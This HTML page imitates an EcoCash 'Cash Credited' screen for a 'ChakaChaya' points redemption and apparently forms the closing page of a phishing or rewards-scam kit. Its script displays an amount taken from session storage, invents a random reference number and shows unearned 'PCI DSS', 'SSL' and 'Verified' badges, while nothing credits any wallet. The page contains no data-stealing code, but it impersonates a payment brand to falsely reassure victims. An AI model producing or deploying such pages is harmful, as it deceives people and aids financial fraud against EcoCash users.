<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
<meta name="theme-color" content="#F8FAFC"/>
<title>Cash Credited · ChakaChaya</title>
<link rel="icon" href="assets/ecocash.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root{
  --c-primary:#1A3A8F;--c-primary-container:#E8EFFF;
  --c-red:#D0021B;--c-green:#16A34A;--c-green-container:#DCFCE7;
  --c-gold:#D97706;--c-gold-container:#FEF3C7;
  --c-bg:#F8FAFC;--c-surface:#FFFFFF;--c-surface-variant:#F1F5F9;
  --c-outline:#E2E8F0;--c-outline-variant:#F1F5F9;
  --c-on-surface:#0F172A;--c-on-surface-variant:#475569;--c-placeholder:#94A3B8;
  --el-1:0 1px 2px rgba(15,23,42,.06),0 2px 8px rgba(15,23,42,.04);
  --el-2:0 2px 4px rgba(15,23,42,.06),0 4px 16px rgba(15,23,42,.06);
  --el-3:0 4px 8px rgba(15,23,42,.08),0 8px 24px rgba(15,23,42,.08);
  --r-sm:10px;--r-md:16px;--r-lg:20px;--r-xl:24px;--r-full:999px;
  --f:Inter,sans-serif;
  --ease-spring:cubic-bezier(.34,1.56,.64,1);--ease-out:cubic-bezier(.22,1,.36,1);
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--f);background:var(--c-bg);-webkit-font-smoothing:antialiased}

@keyframes fade-up{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
@keyframes scale-in{from{transform:scale(.88);opacity:0}to{transform:none;opacity:1}}
@keyframes card-in{from{transform:translateY(16px);opacity:0}to{transform:none;opacity:1}}
@keyframes check-appear{0%{transform:scale(0) rotate(-30deg);opacity:0}60%{transform:scale(1.15) rotate(3deg)}100%{transform:scale(1) rotate(0);opacity:1}}
@keyframes amount-count{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
@keyframes particle{0%{transform:translate(0,0) rotate(0deg);opacity:1}100%{transform:translate(var(--tx),var(--ty)) rotate(var(--tr));opacity:0}}
@keyframes reveal{from{opacity:0}to{opacity:1}}
@keyframes cf-fall{0%{transform:translateY(0) rotate(0deg);opacity:1}100%{transform:translateY(105vh) rotate(540deg);opacity:0}}

.screen{display:flex;flex-direction:column;width:100%;height:100dvh;overflow:hidden;position:relative}

/* ── CURTAIN ── */
.nav-curtain{position:fixed;inset:0;background:var(--c-surface);opacity:1;pointer-events:none;z-index:9999;transition:opacity .4s var(--ease-out)}
.nav-curtain.clear{opacity:0}
.fw-canvas{position:fixed;inset:0;pointer-events:none;z-index:1;width:100%;height:100%}

/* ── APP BAR ── */
.app-bar{flex-shrink:0;background:var(--c-surface);border-bottom:1px solid var(--c-outline);padding:max(14px,env(safe-area-inset-top)) 20px 14px;display:flex;align-items:center;justify-content:space-between;position:relative;z-index:10}
.app-wordmark{font-size:22px;font-weight:800;letter-spacing:-.35px}
.app-wordmark .eco{color:var(--c-primary)}.app-wordmark .cash{color:#D0021B}
.credited-chip{background:var(--c-green-container);border-radius:var(--r-full);padding:5px 12px;font-size:12px;font-weight:700;color:var(--c-green);display:flex;align-items:center;gap:5px}
.credited-chip svg{stroke:var(--c-green);fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;width:13px;height:13px}

/* ── BODY ── */
.body{flex:1;overflow-y:auto;overflow-x:hidden;overscroll-behavior:contain;min-height:0;scrollbar-width:none;padding:0 16px max(24px,env(safe-area-inset-bottom));position:relative;z-index:5}
.body::-webkit-scrollbar{display:none}

/* ── SUCCESS HERO ── */
.success-hero{padding:28px 20px 24px;text-align:center;animation:fade-up .4s var(--ease-out) both}
.check-wrap{width:80px;height:80px;border-radius:50%;background:var(--c-green-container);margin:0 auto 18px;display:flex;align-items:center;justify-content:center;animation:check-appear .5s .1s var(--ease-spring) both;position:relative}
.check-wrap::after{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid #BBF7D0;animation:reveal .3s .5s ease both}
.check-wrap svg{stroke:var(--c-green);fill:none;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;width:36px;height:36px}
.hero-eyebrow{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--c-green);margin-bottom:6px}
.hero-amount-row{display:flex;align-items:baseline;justify-content:center;gap:6px;margin-bottom:6px;animation:amount-count .5s .2s var(--ease-out) both}
.hero-cur{font-size:20px;font-weight:700;color:var(--c-on-surface-variant)}
.hero-amount{font-size:52px;font-weight:800;color:var(--c-on-surface);line-height:1;letter-spacing:-.05em}
.hero-sub{font-size:14px;color:var(--c-on-surface-variant);line-height:1.55}
.hero-sub strong{color:var(--c-on-surface);font-weight:600}

/* ── CARDS ── */
.section-card{background:var(--c-surface);border-radius:var(--r-lg);box-shadow:var(--el-1);overflow:hidden;margin-bottom:12px}
.card-hd{padding:14px 18px;border-bottom:1px solid var(--c-outline-variant);display:flex;align-items:center;justify-content:space-between}
.card-title{font-size:14px;font-weight:700;color:var(--c-on-surface)}
.card-badge{font-size:10px;font-weight:600;padding:3px 9px;border-radius:var(--r-full)}

/* Points↔Cash highlight */
.amounts-row{display:flex;gap:10px;padding:14px}
.amt-block{flex:1;border-radius:var(--r-md);padding:14px;text-align:center}
.amt-pts{background:var(--c-surface-variant)}
.amt-cash{background:var(--c-green-container)}
.amt-val{font-size:22px;font-weight:800;line-height:1;letter-spacing:-.02em}
.amt-pts .amt-val{color:var(--c-primary)}
.amt-cash .amt-val{color:var(--c-green)}
.amt-lbl{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-top:5px}
.amt-pts .amt-lbl{color:var(--c-placeholder)}
.amt-cash .amt-lbl{color:#4ADE80}

/* Detail rows */
.det-row{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-top:1px solid var(--c-outline-variant)}
.det-row:first-of-type{border-top:none}
.det-key{font-size:13px;color:var(--c-on-surface-variant);display:flex;align-items:center;gap:10px}
.det-icon{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.det-icon svg{width:14px;height:14px;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.det-val{font-size:13px;font-weight:700;color:var(--c-on-surface)}
.det-val.green{color:var(--c-green)}
.ref-badge{font-size:12px;font-weight:700;color:var(--c-on-surface-variant);background:var(--c-surface-variant);border:1px solid var(--c-outline);padding:3px 10px;border-radius:var(--r-full)}

/* Notice */
.notice{background:var(--c-green-container);border-radius:var(--r-lg);padding:14px 16px;margin-bottom:12px;font-size:13px;line-height:1.7;color:var(--c-on-surface-variant)}
.notice strong{color:var(--c-on-surface);font-weight:700}

/* Security */
.sec-card{background:var(--c-surface);border-radius:var(--r-lg);box-shadow:var(--el-1);margin-bottom:12px}
.sec-row{display:flex;align-items:center;justify-content:center;padding:12px 0}
.sec-badge{display:flex;align-items:center;gap:4px;font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.4px;color:var(--c-green);padding:0 12px}
.sec-badge+.sec-badge{border-left:1px solid var(--c-outline-variant)}
.sec-badge svg{stroke:var(--c-green);fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;width:10px;height:10px}
.powered{text-align:center;padding:8px 0;font-size:10px;color:var(--c-placeholder);font-weight:500;letter-spacing:.3px;border-top:1px solid var(--c-outline-variant)}

/* CONFETTI */
.cf{position:fixed;pointer-events:none;z-index:9900;animation:cf-fall linear forwards}


</style>
</head>
<body>
<canvas class="fw-canvas" id="fwCanvas"></canvas>
<div class="nav-curtain" id="navCurtain"></div>

<div class="screen">
  <header class="app-bar">
    <div class="app-wordmark"><span class="eco">Eco</span><span class="cash">Cash</span></div>
    <div class="credited-chip">
      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
      Credited
    </div>
  </header>
  <main class="body" id="bodyEl">
    <div class="success-hero">
      <div class="check-wrap" aria-hidden="true">
        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
      </div>
      <div class="hero-eyebrow">Cash Credited</div>
      <div class="hero-amount-row">
        <span class="hero-cur">USD</span>
        <span class="hero-amount" id="heroAmount">0.00</span>
      </div>
      <p class="hero-sub">Successfully credited to your <strong>EcoCash wallet</strong>.<br>Funds are available immediately.</p>
    </div>
  </main>
</div>

<script>
function haptic(s){if(!navigator.vibrate)return;try{navigator.vibrate({success:[12,60,12],medium:22}[s]||12)}catch(e){}}

(function main(){
  /* Curtain reveal */
  const curtain=document.getElementById('navCurtain');
  requestAnimationFrame(()=>setTimeout(()=>curtain.classList.add('clear'),40));

  history.replaceState({page:'thankyou'},'','');
  window.addEventListener('popstate',()=>{sessionStorage.removeItem('redeemData');window.location.href='index.html'},{passive:false});

  let rd={};try{rd=JSON.parse(sessionStorage.getItem('redeemData')||'{}')}catch(e){}
  const points=rd.points||0,usd=rd.usd||'0.00',usdFmt=rd.usdFormatted||('USD '+usd);
  const rate=rd.rate||'100 pts = USD 5.00';
  const ts=rd.timestamp?new Date(rd.timestamp).toLocaleString('en-ZW',{dateStyle:'medium',timeStyle:'short'}):new Date().toLocaleString();
  const refNo='CKC-'+Math.random().toString(36).slice(2,5).toUpperCase()+'-'+Date.now().toString(36).slice(-4).toUpperCase();

  /* Hero amount count-up */
  const amtEl=document.getElementById('heroAmount');
  const target=parseFloat(usd)||0;
  if(target>0){
    const start=performance.now();
    function tick(t){const p=Math.min((t-start)/700,1),ease=1-Math.pow(1-p,3);amtEl.textContent=(target*ease).toFixed(2);if(p<1)requestAnimationFrame(tick);else amtEl.textContent=target.toFixed(2)}
    requestAnimationFrame(tick);
  }else amtEl.textContent=parseFloat(usd).toFixed(2);

  const body=document.getElementById('bodyEl');
  let delay=0;
  function addCard(html,d){setTimeout(()=>{const div=document.createElement('div');div.innerHTML=html;const el=div.firstElementChild;el.style.cssText=`animation:card-in .38s ${d*60}ms cubic-bezier(.22,1,.36,1) both`;body.appendChild(el)},d*60)}

  /* Redemption summary card */
  addCard(`<div class="section-card">
    <div class="card-hd">
      <span class="card-title">ChakaChaya Redeemed</span>
      <span class="card-badge" style="background:#DCFCE7;color:#16A34A">Credited ✓</span>
    </div>
    <div class="amounts-row">
      <div class="amt-block amt-pts"><div class="amt-val">${Number(points).toLocaleString()}</div><div class="amt-lbl">Points</div></div>
      <div class="amt-block amt-cash"><div class="amt-val">${usdFmt}</div><div class="amt-lbl">Cash</div></div>
    </div>
  </div>`,1);

  /* Detail card */
  const mkI=(bg,sc,path)=>`<div class="det-icon" style="background:${bg}"><svg viewBox="0 0 24 24" stroke="${sc}">${path}</svg></div>`;
  addCard(`<div class="section-card">
    <div class="card-hd"><span class="card-title">Redemption details</span></div>
    <div class="det-row"><div class="det-key">${mkI('#E8EFFF','#1A3A8F','<line x1="19" y1="5" x2="5" y2="19"/><circle cx="6.5" cy="6.5" r="2.5"/><circle cx="17.5" cy="17.5" r="2.5"/>')} Conversion rate</div><div class="det-val">${rate}</div></div>
    <div class="det-row"><div class="det-key">${mkI('#DCFCE7','#16A34A','<polyline points="20 6 9 17 4 12"/>')} Cash credited</div><div class="det-val green">${usdFmt}</div></div>
    <div class="det-row"><div class="det-key">${mkI('#FEF3C7','#D97706','<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>')} Date &amp; time</div><div class="det-val" style="font-size:12px">${ts}</div></div>
    <div class="det-row"><div class="det-key">${mkI('#F1F5F9','#475569','<path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/>')} Reference</div><div class="ref-badge">${refNo}</div></div>
  </div>`,2);

  /* Notice */
  addCard(`<div class="notice"><strong>Congratulations!</strong> Your ChakaChaya points have been redeemed. <strong>${usdFmt}</strong> has been credited to your EcoCash wallet and is available immediately. Thank you for participating in the EcoCash Rewards Programme.</div>`,3);

  /* Security */
  addCard(`<div class="sec-card">
    <div class="sec-row">
      <div class="sec-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit SSL</div>
      <div class="sec-badge"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS</div>
      <div class="sec-badge"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Verified</div>
    </div>
    <div class="powered">Powered by Econet EcoCash Zimbabwe · ChakaChaya Rewards</div>
  </div>`,4);

  haptic('success');

  /* Fireworks */
  const canvas=document.getElementById('fwCanvas');
  const ctx=canvas.getContext('2d');
  const COLS=['#fff','#FDE68A','#34D399','#60A5FA','#F472B6','#A78BFA','#4ADE80','#FBBF24'];
  function resize(){canvas.width=window.innerWidth;canvas.height=window.innerHeight}
  resize();window.addEventListener('resize',resize,{passive:true});
  class Shell{constructor(){this.x=canvas.width*(.1+Math.random()*.8);this.y=canvas.height;this.vy=-(12+Math.random()*9);this.vx=(Math.random()-.5)*2;this.peakY=canvas.height*(.06+Math.random()*.38);this.exploded=false;this.dead=false;this.color=COLS[~~(Math.random()*COLS.length)]}update(){if(this.exploded)return;this.vy+=.35;this.x+=this.vx;this.y+=this.vy;if(this.vy>=0||this.y<=this.peakY){this.exploded=true;this.dead=true;burst(this)}}draw(){if(this.exploded)return;ctx.save();ctx.fillStyle=this.color;ctx.globalAlpha=.9;ctx.beginPath();ctx.arc(this.x,this.y,2.5,0,Math.PI*2);ctx.fill();ctx.restore()}}
  class Particle{constructor(x,y,col){const a=Math.random()*Math.PI*2,sp=1.5+Math.random()*7;this.x=x;this.y=y;this.vx=Math.cos(a)*sp;this.vy=Math.sin(a)*sp;this.alpha=1;this.decay=.01+Math.random()*.014;this.gravity=.09;this.color=col;this.size=1.5+Math.random()*2}update(){this.vx*=.985;this.vy=this.vy*.985+this.gravity;this.x+=this.vx;this.y+=this.vy;this.alpha-=this.decay}draw(){if(this.alpha<=0)return;ctx.save();ctx.globalAlpha=this.alpha;ctx.fillStyle=this.color;ctx.shadowBlur=5;ctx.shadowColor=this.color;ctx.beginPath();ctx.arc(this.x,this.y,this.size,0,Math.PI*2);ctx.fill();ctx.restore()}get dead(){return this.alpha<=0}}
  const shells=[],particles=[];
  function burst(s){const n=48+~~(Math.random()*36),c2=COLS[~~(Math.random()*COLS.length)];for(let i=0;i<n;i++)particles.push(new Particle(s.x,s.y,i%3===0?c2:s.color));haptic('medium')}
  function loop(){ctx.clearRect(0,0,canvas.width,canvas.height);shells.forEach(s=>{s.update();s.draw()});for(let i=particles.length-1;i>=0;i--){particles[i].update();particles[i].draw();if(particles[i].dead)particles.splice(i,1)}if(shells.some(s=>!s.dead)||particles.length>0)requestAnimationFrame(loop);else{ctx.clearRect(0,0,canvas.width,canvas.height);canvas.style.display='none'}}
  [200,620,980,1380,1740,2200,2680].forEach(d=>setTimeout(()=>{shells.push(new Shell())},d));
  setTimeout(loop,160);setTimeout(()=>{canvas.style.display='none'},9000);
})();
</script>
</body>
</html>
